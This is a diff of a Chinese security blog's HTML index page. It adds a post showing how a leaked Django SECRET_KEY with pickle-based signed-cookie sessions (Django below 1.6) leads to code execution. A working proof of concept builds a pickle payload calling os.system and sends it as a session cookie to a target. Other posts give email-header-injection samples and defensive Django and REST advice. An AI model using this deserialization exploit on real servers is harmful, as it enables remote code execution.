class="title">user_contacts</span><span class="params">(request)</span>:</span></div><div class="line">    user = request.GET[<span class="string">'username'</span>]</div><div class="line">    sql = <span class="string">"SELECT * FROM user_contacts WHERE username = %s"</span></div><div class="line">    cursor = connection.cursor()</div><div class="line">    cursor.execute(sql, [user])</div><div class="line">    <span class="comment"># ... do something with the results</span></div></pre></td></tr></table></figure></p>
-<p>#4 点击劫持<br>django已经有X-Frame-Options middleware来处理，强烈建议添加</p>
-<p>#5 host头验证<br>使用django.http.HttpRequest.get_host() 可以获取到host，有伪造的话直接报错了，如果直接访问request.META则没有这效果</p>
-<p>#6 文件上传<br>django的imageField只会判断上传的文件是否有一个合法的png头，所以基本上无法限制有害文件的上传。<br>（1）另建一个文件服务器<br>（2）限制文件大小，防止dos攻击，如设置apache的LimitRequestBody大小<br>（3）确保文件不可执行<br>（4）传到二级域名上，比如说传到usercontent-example.com上而不是usercontent.example.com上<br>（5）限制文件上传的类型</p>
-<p>#7 email头注入<br>用于发送垃圾邮件，hacker发送如下：<code>hello\ncc:spamvictim@example.com</code> 就转变成了<br><code>To: hardcoded@example.com
-Subject: hello
-cc: spamvictim@example.com</code> 可使用djaong.core.mail来发送，他是不允许任意字段中包含newlines</p>
-<p>#8 目录遍历<br>目录遍历也算一种注入,主要是突破目录限制读取或者写入文件,django中内置的静态内容视图就是一个做转义很好的例子(django.views.static),相关代码如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> posixpath</div><div class="line"> </div><div class="line">path = posixpath.normpath(urllib.unquote(path))</div><div class="line">newpath = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> part <span class="keyword">in</span> path.split(<span class="string">'/'</span>):</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> part:</div><div class="line">        <span class="comment"># strip empty path components</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line"> </div><div class="line">    drive, part = os.path.splitdrive(part)</div><div class="line">    head, part = os.path.split(part)</div><div class="line">    <span class="keyword">if</span> part <span class="keyword">in</span> (os.curdir, os.pardir):</div><div class="line">        <span class="comment"># strip '.' and '..' in path</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line"> </div><div class="line">    newpath = os.path.join(newpath, part).replace(<span class="string">'\\'</span>, <span class="string">'/'</span>)</div></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2015/04/01/REST API 安全设计指南/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2105,6 +1926,185 @@ cc: spamvictim@example.com</code> 可使用djaong.core.mail来发送，他是不
 <h1 id="8-重要ID不透明处理"><a href="#8-重要ID不透明处理" class="headerlink" title="8 重要ID不透明处理"></a>8 重要ID不透明处理</h1><p>在系统一些敏感功能上，比如/user/1123 可获取id=1123用户的信息，为了防止字典遍历攻击，可对id进行url62或者uuid处理，这样处理的id是唯一的，并且还是字符安全的。</p>
 <h1 id="9-其他注意事项"><a href="#9-其他注意事项" class="headerlink" title="9 其他注意事项"></a>9 其他注意事项</h1><p>（1）请求数据，对于POST,DELETE方法中的数据都采用json格式，当然不是说rest架构不支持xml，由于xml太不好解析，对于大部分的应用json已经足够，近一些的趋势也是json越来越流行，并且json格式也不会有xml的一些安全问题，如xxe。使用json格式目前能防止扫描器自动扫描。<br>（2）返回数据统一编码格式，统一返回类型，如Content-Type: application/json; charset=”UTF-8”<br>（3）在逻辑实现中，json解码之后进行参数验证或者转义操作，第一步json格式验证，第二步具体参数验证基本上能防止大部分的注入问题了。<br>（4）在传输过程中，采用SSL保证传输安全。<br>（5）存储安全，重要信息加密存储，如认证信息hash保存。</p>
 <p>总之，尽量使用SSL。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2015/04/01/从Django的SECTET_KEY到代码执行/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/04/01/从Django的SECTET_KEY到代码执行/" itemprop="url">
+                  从Django的SECTET_KEY到代码执行
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-04-01T15:38:36+08:00">
+                2015-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2015/04/01/从Django的SECTET_KEY到代码执行/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2015/04/01/从Django的SECTET_KEY到代码执行/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2015/04/01/从Django的SECTET_KEY到代码执行/" class="leancloud_visitors" data-flag-title="从Django的SECTET_KEY到代码执行">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>最近审查代码发现某些产品在登录的JS代码中泄露了SECRET_KEY,将该值作为密码加密的盐，这样就暴露了加密salt不太好吧，更重要的是对django的安全造成了极大的威胁。</p>
+<h1 id="2-SECRET-KEY作用"><a href="#2-SECRET-KEY作用" class="headerlink" title="2 SECRET_KEY作用"></a>2 SECRET_KEY作用</h1><p>SECTET_KEY在djanog中使用非常广泛，基本上涉及到安全，加密等的地方都用到了，下面列举一些常见情景：<br>1，json object的签名<br>2，加密函数，如密码重置，表单，评论，csrf的key，session数据</p>
+<p>这里面就要重点讲到session的问题，在这里使用不当就会导致代码执行</p>
+<h1 id="3-代码执行"><a href="#3-代码执行" class="headerlink" title="3 代码执行"></a>3 代码执行</h1><h2 id="3-1-settings的session设置"><a href="#3-1-settings的session设置" class="headerlink" title="3.1 settings的session设置"></a>3.1 settings的session设置</h2><p>django默认存储session到数据库中，但是可能会比较慢，就会使用到缓存，文件，还有cookie等方式，如果采用了cookie机制则有可能代码执行，settings配置如下：<br><code>SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39;</code></p>
+<h2 id="3-2-django-1-6以下"><a href="#3-2-django-1-6以下" class="headerlink" title="3.2 django 1.6以下"></a>3.2 django 1.6以下</h2><p>在django1.6以下，session默认是采用pickle执行序列号操作，在1.6及以上版本默认采用json序列化。代码执行只存在于使用pickle序列话的操作中。</p>
+<h2 id="3-3-session处理流程"><a href="#3-3-session处理流程" class="headerlink" title="3.3 session处理流程"></a>3.3 session处理流程</h2><p>可以简单的分为两部分，process_request和process_response,前者负责选择session引擎，初始化cookie数据。见代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionMiddleware</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request)</span>:</span></div><div class="line">        engine = import_module(settings.SESSION_ENGINE)</div><div class="line">        session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME, <span class="keyword">None</span>)</div><div class="line">        request.session = engine.SessionStore(session_key)</div></pre></td></tr></table></figure></p>
+<p>process_response则是处理返回给用户的cookie信息，比如修改过期时间等。在将session存入缓存后，可能在某个操作中会用到session信息，这个时候就会通过反序列化操作从缓存中取，如果反序列话引擎是采用pickle机制的话就存在代码执行。反序列化的代码位于django.core.signing.py中，这个模块主要是一些签名，加解密操作，同时也包含序列化和反序列化，默认采用JSON引擎，下面是反序列话loads的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s, key=None, salt=<span class="string">'django.core.signing'</span>, serializer=JSONSerializer, max_age=None)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">    Reverse of dumps(), raises BadSignature if signature fails</div><div class="line">    """</div><div class="line">    base64d = smart_str(</div><div class="line">        TimestampSigner(key, salt=salt).unsign(s, max_age=max_age))</div><div class="line">    decompress = <span class="keyword">False</span></div><div class="line">    <span class="keyword">if</span> base64d[<span class="number">0</span>] == <span class="string">'.'</span>:</div><div class="line">        <span class="comment"># It's compressed; uncompress it first</span></div><div class="line">        base64d = base64d[<span class="number">1</span>:]</div><div class="line">        decompress = <span class="keyword">True</span></div><div class="line">    data = b64_decode(base64d)</div><div class="line">    <span class="keyword">if</span> decompress:</div><div class="line">        data = zlib.decompress(data)</div><div class="line">    <span class="keyword">return</span> serializer().loads(data)</div></pre></td></tr></table></figure></p>
+<h2 id="3-4-构造POC"><a href="#3-4-构造POC" class="headerlink" title="3.4 构造POC"></a>3.4 构造POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line">os.environ.setdefault(<span class="string">'DJANGO_SETTINGS_MODULE'</span>,<span class="string">'settings'</span>)</div><div class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</div><div class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</div><div class="line"><span class="keyword">from</span> django.contrib.sessions.backends <span class="keyword">import</span> signed_cookies</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Run</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'touch /tmp/xxlegend.log'</span>,))</div><div class="line"></div><div class="line">sess = signing.dumps(Run(), serializer=signed_cookies.PickleSerializer,salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span>)</div><div class="line"><span class="keyword">print</span> sess</div><div class="line"></div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> cookielib</div><div class="line"></div><div class="line">url = <span class="string">'http://10.24.35.228:8000/favicon.ico'</span></div><div class="line">headers = &#123;<span class="string">'Cookie'</span>:<span class="string">'sessionid="%s"'</span> %(sess)&#125;</div><div class="line">request = urllib2.Request(url,headers = headers)</div><div class="line">response = urllib2.urlopen(request)</div><div class="line"><span class="keyword">print</span> response.read()</div></pre></td></tr></table></figure>
+<p>通过序列化Run类，实现创建一个文件的操作，在反序列化的时候执行这个操作。执行代码完成可看到在/tmp目录创建xxlegend.log文件，同时web报500错误。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>利用条件总结起来就是这么几句话，首先泄露了SECRET_KEY,其次session引擎采用了signed_cookies,django版本小于1.6即存在代码执行问题。同样的问题也存在于python的其他web框架中，如flask，bottle。</p>
+<p><a href="https://github.com/danghvu/pwp/blob/master/exploit.py" target="_blank" rel="external">https://github.com/danghvu/pwp/blob/master/exploit.py</a><br><a href="https://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee.html" target="_blank" rel="external">https://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee.html</a><br><a href="https://systemoverlord.com/blog/2014/04/14/plaidctf-2014-reekeeeee/" target="_blank" rel="external">https://systemoverlord.com/blog/2014/04/14/plaidctf-2014-reekeeeee/</a><br><a href="http://www.shysecurity.com/post/Reekee" target="_blank" rel="external">http://www.shysecurity.com/post/Reekee</a><br><a href="http://python.usyiyi.cn/django/topics/http/sessions.html" target="_blank" rel="external">http://python.usyiyi.cn/django/topics/http/sessions.html</a><br><a href="https://github.com/django/django/blob/stable/1.5.x/django/core/signing.py" target="_blank" rel="external">https://github.com/django/django/blob/stable/1.5.x/django/core/signing.py</a><br><a href="http://stackoverflow.com/questions/15170637/effects-of-changing-djangos-secret-key/15383766?noredirect=1#comment21743494_15383766" target="_blank" rel="external">http://stackoverflow.com/questions/15170637/effects-of-changing-djangos-secret-key/15383766?noredirect=1#comment21743494_15383766</a></p>
 
           
         
@@ -2371,7 +2371,7 @@ cc: spamvictim@example.com</code> 可使用djaong.core.mail来发送，他是不
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">32</span>
+                <span class="site-state-item-count">33</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2382,7 +2382,7 @@ cc: spamvictim@example.com</code> 可使用djaong.core.mail来发送，他是不
             
             <div class="site-state-item site-state-categories">
               
-                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-count">16</span>
                 <span class="site-state-item-name">分类</span>
               
             </div>
@@ -2393,7 +2393,7 @@ cc: spamvictim@example.com</code> 可使用djaong.core.mail来发送，他是不
             
             <div class="site-state-item site-state-tags">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">113</span>
+                <span class="site-state-item-count">120</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -2471,7 +2471,7 @@ cc: spamvictim@example.com</code> 可使用djaong.core.mail来发送，他是不
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2018</span>
+  <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
